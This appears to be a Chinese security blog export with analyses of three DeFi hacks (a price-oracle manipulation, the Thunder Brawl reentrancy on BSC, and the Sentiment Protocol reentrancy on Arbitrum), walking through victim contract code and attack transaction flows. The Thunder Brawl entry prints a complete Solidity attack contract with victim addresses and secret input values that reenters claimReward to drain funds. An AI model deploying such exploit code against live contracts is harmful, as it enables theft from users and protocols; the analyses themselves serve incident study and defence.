<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function assetPrice() public view override returns (uint256) &#123;</span><br><span class="line">    return priceOracle.lpPrice();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进一步阅读etherscan上源码，可得priceOracle地址为0x2ffCC661011beC72e1A9524E12060983E74D14ce，查看该合约的<code>lpPrice()</code>函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function lpPrice() external view returns (uint256) &#123;</span><br><span class="line">    return (totalHoldings() * 1e18) / totalSupply();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>价格取决于<code>totalHoldings()</code>函数，<code>totalSupply()</code>为ERC标准函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function totalHoldings() public view returns (uint256) &#123;</span><br><span class="line">    uint256 length = _poolInfo.length;</span><br><span class="line">    uint256 totalHold = 0;</span><br><span class="line">    for (uint256 pid = 0; pid &lt; length; pid++) &#123;</span><br><span class="line">        totalHold += _poolInfo[pid].strategy.totalHoldings();</span><br><span class="line">    &#125;</span><br><span class="line">    return totalHold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个会取决于每个_poolInfo[pid].strategy的Holdings()函数，这里我们去看<code>MIMCurveStakeDao</code>对应的函数，源码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function totalHoldings() public view virtual returns (uint256) &#123;</span><br><span class="line">    uint256 crvLpHoldings = (vault.liquidityGauge().balanceOf(address(this)) * getCurvePoolPrice()) /</span><br><span class="line">        CURVE_PRICE_DENOMINATOR;</span><br><span class="line"></span><br><span class="line">    uint256 sdtEarned = vault.liquidityGauge().claimable_reward(address(this), address(_config.sdt));</span><br><span class="line">    uint256 amountIn = sdtEarned + _config.sdt.balanceOf(address(this));</span><br><span class="line">    uint256 sdtEarningsInFeeToken = priceTokenByExchange(amountIn, _config.sdtToFeeTokenPath);</span><br><span class="line"></span><br><span class="line">    uint256 crvEarned = vault.liquidityGauge().claimable_reward(address(this), address(_config.crv));</span><br><span class="line">    amountIn = crvEarned + _config.crv.balanceOf(address(this));</span><br><span class="line">    uint256 crvEarningsInFeeToken = priceTokenByExchange(amountIn, _config.crvToFeeTokenPath);</span><br><span class="line"></span><br><span class="line">    uint256 tokensHoldings = 0;</span><br><span class="line">    for (uint256 i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">        tokensHoldings += _config.tokens[i].balanceOf(address(this)) * decimalsMultipliers[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return</span><br><span class="line">        tokensHoldings +</span><br><span class="line">        crvLpHoldings +</span><br><span class="line">        (sdtEarningsInFeeToken + crvEarningsInFeeToken) *</span><br><span class="line">        decimalsMultipliers[feeTokenId];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function priceTokenByExchange(uint256 amountIn, address[] memory exchangePath)</span><br><span class="line">    internal</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    if (amountIn == 0) return 0;</span><br><span class="line">    uint256[] memory amounts = _config.router.getAmountsOut(amountIn, exchangePath);</span><br><span class="line">    return amounts[amounts.length - 1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点关注sdtEarningsInFeeToken，因为攻击者在此之前，给该合约存入了大量的SDT，仔细看一下<code>priceTokenByExchange()</code>函数</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401122017418.png" alt="image-20240112201732602"></p>
<p>进一步可以去SushiSwap: Router中查看<code>getAmountsOut()</code>函数，发现其返回值与amountIn正相关，amountIn的值一定程度上取决于该合约当前的SDT余额，而攻击者在此之前给该地址存入了大量的SDT，最终导致sdtEarningsInFeeToken数量过高，CachedAssetPrice价格过高</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401122036619.png" alt="image-20240112203605220"></p>
<ol>
<li>随后攻击者调用SushiSwap: Router的<code>swapExactTokensForTokens</code>函数，将SDT转化为WETH，将WETH换成USDT</li>
<li>随后调用UZD合约中的balanceOf函数，发现其依赖于被操纵的cacheAssetPrice价格，具体如下：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function balanceOf(address account) public view virtual override returns (uint256) &#123;</span><br><span class="line">    if (!containRigidAddress(account)) return super.balanceOf(account);</span><br><span class="line"></span><br><span class="line">    return _balancesRigid[account];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function balanceOf(address account) public view virtual override returns (uint256) &#123;</span><br><span class="line">    // don&#x27;t cache price</span><br><span class="line">    return _convertFromNominalCached(_balances[account], Math.Rounding.Down);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _convertFromNominalWithCaching(uint256 nominal, Math.Rounding rounding)</span><br><span class="line">    internal</span><br><span class="line">    virtual</span><br><span class="line">    returns (uint256 value)</span><br><span class="line">&#123;</span><br><span class="line">    if (nominal == type(uint256).max) return type(uint256).max;</span><br><span class="line">    _cacheAssetPriceByBlock();</span><br><span class="line">    return nominal.mulDiv(assetPriceCached(), DEFAULT_DECIMALS_FACTOR, rounding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以其会错误计算攻击者的UZD余额，这时攻击者进行相应的套利即可</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401122037904.png" alt="image-20240112203656910"></p>
<ol>
<li><p>通过Curve.fi Factory Pool的exchange函数，先将错误余额数量的UZD，一部分兑换为crvFRAX，另一部分兑换为crvUSD。</p>
<p>移除Curve Finance: Swap中的流动性，攻击者获得对应的FRAX和USDC。</p>
<p>调用exchange函数，将对应的FRAX和crvUSD兑换城USDC</p>
<p>并且最后将大部分的USDC全部兑换成USDT，现在攻击者资产为USDT和USDC。</p>
</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401122046516.png" alt="image-20240112204626131"></p>
<ol>
<li>调用WETH-USDCpair对的闪电贷，获得大量的WETH，攻击者偿还相应数量的USDC，并偿还第2步中Balancer: Vault闪电贷借贷的WETH和USDC，最后偿还第一步中uniswapV3借贷的USDT</li>
<li>最后偿还完闪电贷后，攻击者获得资产USDT和WETH，将其全部提取完成攻击。</li>
</ol>
<p>再简单看一下另一个攻击交易0x2aec4fdb2a09ad4269a410f2c770737626fb62c54e0fa8ac25e8582d4b690cca</p>
<ul>
<li>也是先调用攻击合约，后进行闪电贷，借出WETH，然后通过curve finance将eth兑换成zETH</li>
<li>将ETH兑换成CRV，存入sEthFraxEthCurveConvex合约中，与上述相同，攻击者账户的zETH余额和sEthFraxEthCurveConvex合约中的CRV余额相关，攻击者通过多次在wETH/CRV在池子中兑换CRV，操纵了CRV的价格和漏洞合约的CRV余额，最终导致CachedAssetPrice变大</li>
</ul>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>安全事件分析</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>Defi安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Defi安全-Thunder Brawl攻击事件分析</title>
    <url>/2024/02/28/Defi%E5%AE%89%E5%85%A8-Thunder-Brawl%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-Thunder-Brawl重入攻击事件相关信息"><a href="#1-Thunder-Brawl重入攻击事件相关信息" class="headerlink" title="1. Thunder Brawl重入攻击事件相关信息"></a>1. Thunder Brawl重入攻击事件相关信息</h2><p>2022年9月30日发生在BSC上的重入攻击，回调函数属于ERC721的hook类型</p>
<ul>
<li>攻击交易的哈希：<a href="https://bscscan.com/tx/0x57aa9c85e03eb25ac5d94f15f22b3ba3ab2ef60b603b97ae76f855072ea9e3a0">Transaction Hash (Txhash) Details | BscScan⁤</a></li>
<li>攻击者的地址：<a href="https://bscscan.com/address/0xbc62b9ba570ad783d21e5eb006f3665d3f6bba93">Attacker Address | BscScan⁤</a></li>
<li>攻击合约的地址：<a href="https://bscscan.com/address/0xfed1b640633fd0a4d77315d229918ab1f6e612f9">Exploit Contract Address | BscScan</a></li>
<li><p>受害合约的地址：<a href="https://bscscan.com/address/0xae191ca19f0f8e21d754c6cab99107ed62b6fe53#code">House_Wallet| BscScan</a>，<a href="https://bscscan.com/address/0x72e901f1bb2bfa2339326dfb90c5cec911e2ba3c#code">THB_Roulette| BscScan</a></p>
</li>
<li><p>phalcon攻击序列分析：<a href="https://phalcon.blocksec.com/explorer/tx/bsc/0x57aa9c85e03eb25ac5d94f15f22b3ba3ab2ef60b603b97ae76f855072ea9e3a0">Phalcon Explorer (blocksec.com)</a></p>
</li>
</ul>
<h2 id="2-Thunder-Brawl重入攻击事件分析"><a href="#2-Thunder-Brawl重入攻击事件分析" class="headerlink" title="2. Thunder Brawl重入攻击事件分析"></a>2. Thunder Brawl重入攻击事件分析</h2><p>该项目应该是一个NFT的游戏合约</p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402291216514.png" alt="image-20240229121142067"></p>
<ol>
<li>攻击合约首先调用受害合约<code>House Wallet</code>中的shoot函数</li>
</ol>
<p>从bscscan上看一下该函数的源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function shoot(</span><br><span class="line">        uint256 random,</span><br><span class="line">        uint256 gameId,</span><br><span class="line">        bool feestate,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add,</span><br><span class="line">        bool nftcheck,</span><br><span class="line">        bool dystopianCheck</span><br><span class="line">    ) external payable &#123;</span><br><span class="line">        require(gameMode);</span><br><span class="line">//首先判断传入的金额是否在规定的范围之内，并计算相应的费用</span><br><span class="line">        if (0.32 * 10**18 &gt;= msg.value &amp;&amp; 0.006 * 10**18 &lt;= msg.value) &#123;</span><br><span class="line">            playerFee = ((msg.value * 38) / 1038);</span><br><span class="line">            holderFee = ((playerFee * 25) / 1000);</span><br><span class="line">            liquidityFee = ((playerFee * 1) / 1000);</span><br><span class="line">            ownerFee = ((playerFee * 125) / 100000);</span><br><span class="line">//根据传入的值，判断是否与预先设定的哈希值相等，可以看guesswin函数的源码</span><br><span class="line">            bool checkWinstatus = guessWin(_x, name, _add);</span><br><span class="line">//如果猜对了，将玩家地址和赢得的金额记录到映射中</span><br><span class="line">            if (checkWinstatus == true) &#123;</span><br><span class="line">                winners[gameId][msg.sender] = (msg.value - playerFee);</span><br><span class="line">                winStatus = true;</span><br><span class="line">            &#125;</span><br><span class="line">//相关费用的转账</span><br><span class="line">            if (feestate == true) &#123;</span><br><span class="line">                payable(Fee_Wallet).transfer(holderFee);</span><br><span class="line">                payable(Liqudity_Address).transfer(liquidityFee);</span><br><span class="line">                payable(owner()).transfer(ownerFee);</span><br><span class="line">            &#125;</span><br><span class="line">//随机数的生成和额外NFT奖励的计算与判断，满足相应的条件即用rewardStatus进行相应记录，然而这里攻击者是有可能进行操控的</span><br><span class="line">            randomNumber =</span><br><span class="line">                uint256(</span><br><span class="line">                    keccak256(</span><br><span class="line">                        abi.encodePacked(</span><br><span class="line">                            msg.sender,</span><br><span class="line">                            block.timestamp,</span><br><span class="line">                            randomNumber</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                ) %</span><br><span class="line">                10;</span><br><span class="line">            if (winStatus == true) &#123;</span><br><span class="line">                if (nftcheck == true &amp;&amp; randomNumber == random) &#123;</span><br><span class="line">                    rewardStatus = true;</span><br><span class="line">                &#125;</span><br><span class="line">                winStatus = false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (dystopianCheck == true &amp;&amp; randomNumber == random) &#123;</span><br><span class="line">                    rewardStatus = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            fakeUsers.push(msg.sender);</span><br><span class="line">            gameMode = false;</span><br><span class="line">            dangerMode = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function guessWin(</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add</span><br><span class="line">    ) public view returns (bool) &#123;</span><br><span class="line">        return sha256(abi.encode(_x, name, _add)) == hashValueTwo;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>随后攻击者合约调用了受害合约的claimReward函数，通过函数名可知是计算相应奖励的函数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    function claimReward(</span><br><span class="line">        uint256 _ID,</span><br><span class="line">        address payable _player,</span><br><span class="line">        uint256 _amount,</span><br><span class="line">        bool _rewardStatus,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(gameMode);</span><br><span class="line">  //首先是对玩家的身份进行相应的确认，验证逻辑不需要详细了解</span><br><span class="line">        bool checkValidity = guess(_x, name, _add);</span><br><span class="line">//如果_amount金额数量对上的话，则给攻击合约转账相应的奖励，_player就是攻击合约的地址</span><br><span class="line">        if (checkValidity == true) &#123;</span><br><span class="line">            if (winners[_ID][_player] == _amount) &#123;</span><br><span class="line">                _player.transfer(_amount * 2);</span><br><span class="line">//这部分发送额外的奖励</span><br><span class="line">                if (_rewardStatus == true) &#123;</span><br><span class="line">                    sendReward();</span><br><span class="line">                &#125;</span><br><span class="line">                delete winners[_ID][_player];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (_rewardStatus == true) &#123;</span><br><span class="line">                    sendRewardDys();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rewardStatus = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>接下来进入Thunderbrawl Roulette (THBR)中看一下reward函数的逻辑</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  function reward(address to,uint256 _mintAmount) external &#123;</span><br><span class="line">        uint256 supply = totalSupply();</span><br><span class="line">        uint256 rewardSupply = rewardTotal;</span><br><span class="line">        require(rewardSupply &lt;= rewardSize,&quot;&quot;);</span><br><span class="line">        for (uint256 i = 1; i &lt;= _mintAmount; i++) &#123;          </span><br><span class="line">          _safeMint(to, supply + i); </span><br><span class="line">          rewardTotal++;         </span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">//上述的RewardStatus攻击者可以操控，这里攻击者将获得NFT奖励</span><br><span class="line">  function _safeMint(</span><br><span class="line">        address to,</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        _mint(to, tokenId);</span><br><span class="line">        require(</span><br><span class="line">            _checkOnERC721Received(address(0), to, tokenId, data),</span><br><span class="line">            &quot;ERC721: transfer to non ERC721Receiver implementer&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>这里给攻击合约发送NFT奖励的时候，会触发攻击者的onERC721Received函数，如下图所示</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282058873.png" alt="image-20240228205826174"></p>
<ol>
<li>继续观察phalcon的攻击序列，在onERC721Received中攻击者进行重入，再次调用了claimReward函数，传入的参数与之前一模一样，这时攻击者再次获利，重复进入了4次</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202402282102830.png" alt="image-20240228210235520"></p>
<h2 id="3-Thunder-Brawl攻击合约"><a href="#3-Thunder-Brawl攻击合约" class="headerlink" title="3. Thunder Brawl攻击合约"></a>3. Thunder Brawl攻击合约</h2><p>根据Defihacklab的Foundry仿写的攻击合约代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">interface IERC721Receiver &#123;</span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256 tokenId,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external returns (bytes4);</span><br><span class="line">&#125;</span><br><span class="line">interface HouseWallet&#123;</span><br><span class="line">    function winners(uint256 id, address player) view external returns(uint256);</span><br><span class="line">    function claimReward(</span><br><span class="line">        uint256 _ID,</span><br><span class="line">        address payable _player,</span><br><span class="line">        uint256 _amount,</span><br><span class="line">        bool _rewardStatus,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add</span><br><span class="line">    ) external;</span><br><span class="line">    function shoot(</span><br><span class="line">        uint256 random,</span><br><span class="line">        uint256 gameId,</span><br><span class="line">        bool feestate,</span><br><span class="line">        uint256 _x,</span><br><span class="line">        string memory name,</span><br><span class="line">        address _add,</span><br><span class="line">        bool nftcheck,</span><br><span class="line">        bool dystopianCheck</span><br><span class="line">    ) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractTest&#123;</span><br><span class="line"></span><br><span class="line">    HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);</span><br><span class="line">    uint256 randomNumber =  12345678000000000000000000;</span><br><span class="line"></span><br><span class="line">    uint256 gameId = 1;</span><br><span class="line">    bool feestate = false;</span><br><span class="line">     // sha256(abi.encode(_x, name, _add)) == hashValueTwo maybe off-chain calculate</span><br><span class="line">    uint256 _x = 2845798969920214568462001258446;</span><br><span class="line">    string  name = &quot;HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS&quot;;</span><br><span class="line">    address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;</span><br><span class="line"></span><br><span class="line">    bool nftcheck = true;</span><br><span class="line">    bool dystopianCheck = true;</span><br><span class="line"></span><br><span class="line">    address payable add = payable(address(this));</span><br><span class="line">    bool _rewardStatus = true;</span><br><span class="line">    // sha256(abi.encode(_x, name, _add)) == hashValue  maybe off-chain calculate</span><br><span class="line">    uint256 _x1 = 969820990102090205468486;</span><br><span class="line">    string name1 = &quot;WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME&quot;;</span><br><span class="line">    IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C); // Thunderbrawl Roulette Contract</span><br><span class="line"></span><br><span class="line">	receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        houseWallet.shoot&#123;value: 0.32 ether&#125;(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);</span><br><span class="line">        uint256 _amount = houseWallet.winners(gameId, add);</span><br><span class="line">        houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address _operator, </span><br><span class="line">        address _from, </span><br><span class="line">        uint256 _tokenId, </span><br><span class="line">        bytes calldata _data</span><br><span class="line">        ) </span><br><span class="line">        payable </span><br><span class="line">        external </span><br><span class="line">        returns (bytes4)&#123;</span><br><span class="line">            uint256 _amount = houseWallet.winners(gameId, add);</span><br><span class="line">            if(address(houseWallet).balance &gt;= _amount * 2)&#123;</span><br><span class="line">                houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);</span><br><span class="line">            &#125;</span><br><span class="line">            return bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Defi安全</category>
        <category>安全事件分析</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>安全事件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Defi安全--Sentiment Protocol攻击事件分析</title>
    <url>/2024/01/21/Defi%E5%AE%89%E5%85%A8-Sentiment-Protocol%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="1-Sentiment-Protocol攻击事件相关信息"><a href="#1-Sentiment-Protocol攻击事件相关信息" class="headerlink" title="1. Sentiment Protocol攻击事件相关信息"></a>1. Sentiment Protocol攻击事件相关信息</h2><p>2023年4月5日，在Arbitrum上的Sentiment项目被攻击</p>
<ul>
<li>攻击合约的地址：<a href="https://arbiscan.io/address/0x9f626f5941fafe0a5b839907d77fbbd5d0dea9d0">Contract Address 攻击合约| Arbiscan</a></li>
<li>攻击者地址：<a href="https://arbiscan.io/address/0xdd0cdb4c3b887bc533957bc32463977e432e49c3">Sentimentxyz Exploiter  Arbiscan</a></li>
<li>攻击交易：<a href="https://arbiscan.io/tx/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d">Arbitrum Transaction Hash (Txhash) Details | Arbiscan</a></li>
<li>Phalcon序列分析：<a href="https://phalcon.blocksec.com/explorer/tx/arbitrum/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d">0xa9ff2b587e2741575d | Phalcon Explorer (blocksec.com)</a></li>
</ul>
<h2 id="2-Sentiment-Protocol攻击事件分析"><a href="#2-Sentiment-Protocol攻击事件分析" class="headerlink" title="2. Sentiment Protocol攻击事件分析"></a>2. Sentiment Protocol攻击事件分析</h2><h3 id="Sentiment项目简介"><a href="#Sentiment项目简介" class="headerlink" title="Sentiment项目简介"></a>Sentiment项目简介</h3><p>Sentiment项目：<code>不足额抵押</code>，抵押价值较少的token，却能够借贷较多价值的token，<code>不足额抵押</code>的token不会直接给到用户，而是存在一个和用户一一对应的Account中，用户可以指挥Account去Defi中（Sentiment的白名单合作伙伴），如aave、balancer等项目中投资。</p>
<p>大多数情况用户不能自由对资金操作，用户能否自由地处理这笔资金，取决于是否能够绕过Sentiment的RiskEngine的安全检查。</p>
<h3 id="攻击流程详解："><a href="#攻击流程详解：" class="headerlink" title="攻击流程详解："></a>攻击流程详解：</h3><ol>
<li>该攻击是发生在Arbitrum链上的Sentiment项目，攻击者直接调用对应的run()函数，发起攻击</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211048889.png" alt="image-20240121104839972" style="zoom:80%;" /></p>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211049470.png" alt="image-20240121104910090"></p>
<ol>
<li>攻击合约调用Aave的闪电贷函数，借出对应的WBTC、WETH、USDC.e三种代币，606个WBTC，10050个WETH和18,000,000个 USDC，<code>isFlashBorrower</code>会判断是否已经借款，随后执行响应的闪电贷逻辑，乐观转账，将三种代币转到攻击者合约账户上</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211108030.png" alt="image-20240121110845649"></p>
<ol>
<li>攻击者先查看的pair(B-33WETH-33WBTC-33USDC)池子中的价格，随后调用Proxy_62c5_6403合约（Sentiment协议中）去创建一个Account账户，对应攻击者的账户，地址记为BeaconProxy，下图是创建Account的步骤，涉及到Balancer项目逻辑。</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211117349.png" alt="image-20240121111747175"></p>
<ol>
<li>随后攻击者给Proxy代理合约，授权了50个WETH，随后调用proxy代理合约的<code>deposit()</code>函数，给BeaconProxy攻击者对应的账户进行响应的存款，将对应的50个WETH转到BeaconProxy合约中，具体步骤如下：</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211123766.png" alt="image-20240121112351411"></p>
<ol>
<li><p>随后攻击者调用Proxy代理合约的approve函数，即AccountManager合约进行授权，让AccountManager将存款的50个WETH，授权给Balancer: Vault合约进行相应的投资</p>
</li>
<li><p>随后攻击者调用的AccountManager的exec函数，执行相应的Balancer: Vault投资，判断是不是BeaconProxy合约等，然后调用BeaconProxy合约的exec函数，向Balancer的B-33WETH-33WBTC-33USDC池子中，存入50个WETH，进行相应的转账，攻击者获得221个B-33WETH-33WBTC-33USDC的LP</p>
</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211134707.png" alt="image-20240121113357220"></p>
<ol>
<li>随后攻击者将相应的606个WBTC，10000个WETH和18,000,000个 USDC都给Balancer: Vault，该项目的合约进行相应的授权</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211139904.png" alt="image-20240121113943173"></p>
<ol>
<li>随后攻击者绕过Sentiment项目，直接给Balancer: Vault该项目的B-33WETH-33WBTC-33USDC池进行投资，同样调用的是<code>onJoinPool</code>函数，这时候池子中的LP价格上升，攻击者有13w个LP</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211142981.png" alt="image-20240121114252559"></p>
<ol>
<li>这时候攻击者调用Balancer: Vault的<code>exitPool</code>函数，想取走所有的存款，这是Balancer会进行相应的转账，将资金转给攻击者，而这时WETH的转账就触发了攻击者的fallback函数，这里注意取款的时候，会先对相应的LP进行销毁（关键步骤）</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211543577.png" alt="image-20240121154256697">10.  因为在4-6步中，攻击者在sentiment中存入了50个WETH，作为抵押物，攻击者能够进行不足额借贷，这是攻击者想借出461000USDC、361000USDT、81ETH、125000FRAX，看一下这里的借币逻辑，抵押物能借多少款，是有对应的限制</p>
<ol>
<li>攻击者调用AccountManager合约中的borrow函数，以USDC为例进行说明，会直接调用到LUSD Coin (LUSDC)合约的lendTo函数，lendTo将将借款的USDC，减去部分手续费后，转给BeaconProxy，管理用户account的合约。</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211508106.png" alt="image-20240121150832950"></p>
<ol>
<li><p>RiskEngine调用<code>isAccountHealthy</code>函数，检查用户的仓位是否健康，正常；攻击者手上因为抵押50WETH，现有有200多LP，随后通过OracleFacade合约，得到LP当前的价格，进入该函数看一下函数源码：</p>
<ul>
<li>该函数先获得池子中token种类，以及对应的余额，即为B-33WETH-33WBTC-33USDC三种代币</li>
<li>池子代币权重应该是相同的</li>
<li>计算对应的LP价格，忽略乘除法，指数运算，关注变量在分子还是分母即可</li>
</ul>
<script type="math/tex; mode=display">
price = \frac{Price(token_i)*Balance(token_i)....}{TotalSupply(LP token)}</script></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    function getPrice(address token) external view returns (uint) &#123;</span><br><span class="line">        (</span><br><span class="line">            address[] memory poolTokens,</span><br><span class="line">            uint256[] memory balances,</span><br><span class="line">        ) = vault.getPoolTokens(IPool(token).getPoolId());</span><br><span class="line"></span><br><span class="line">        uint256[] memory weights = IPool(token).getNormalizedWeights();</span><br><span class="line"></span><br><span class="line">        uint length = weights.length;</span><br><span class="line">        uint temp = 1e18;</span><br><span class="line">        uint invariant = 1e18;</span><br><span class="line">        for(uint i; i &lt; length; i++) &#123;</span><br><span class="line">            temp = temp.mulDown(</span><br><span class="line">                (oracleFacade.getPrice(poolTokens[i]).divDown(weights[i]))</span><br><span class="line">                .powDown(weights[i])</span><br><span class="line">            );</span><br><span class="line">            invariant = invariant.mulDown(</span><br><span class="line">                (balances[i] * 10 ** (18 - IERC20(poolTokens[i]).decimals()))</span><br><span class="line">                .powDown(weights[i])</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        return invariant</span><br><span class="line">            .mulDown(temp)</span><br><span class="line">            .divDown(IPool(token).totalSupply());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211530739.png" alt="image-20240121153045993"></p>
<ol>
<li>这里<code>isAccountHealthy</code>判断账户是否正常的逻辑是判断，用户的资产和用户想借贷的金额不能超出一个阈值，而用户的资产是和用户代币的数量和代币目前的价格计算决定的。通过上图，能发现LP的价格在经过Balancer直接存款后，是大大增加的</li>
<li><p>由于取款的时候，先将对应的LPtoken销毁，随后进行三种代币的转账，其中ETH触发fallback函数，这是攻击者通过Sentiment进行借款，通过上述公式，可见LPtoken数量减少，但这是Token的余额都还没有更新，导致LP代币的价格大幅度增加，用户可以借出超出它抵押的金额</p>
</li>
<li><p>在借出大量的资金后，攻击者将所有的代币都通过AccountManager合约，进行相应的投资，先进行approve操作，后调用exec函数，都投资到Aave中</p>
</li>
</ol>
<p><img src="https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401211553791.png" alt="image-20240121155340470"></p>
<ol>
<li>这里看一下AccountManager的六个exec都干了什么事情：将对应的稳定币都转换为aArbitrum上的币，并通过AccountManager合约转出给攻击者，为什么能转给攻击者？<ul>
<li><code>isAccountHealthy</code>判断账户是否正常的逻辑是判断，用户的资产和用户想借贷的金额不能超出一个阈值，用户的LP资产价值大大增加，故可进行其它代币的转账操作</li>
</ul>
</li>
<li>这是fallback函数执行结束，USDC也完成相应的转账，PoolBalanceChanged池子中的代币余额才发生变化，随后攻击者给Aave合约进行相应的代币授权，其要包含交易的手续费，Aave的闪电贷函数会自动进行扣款</li>
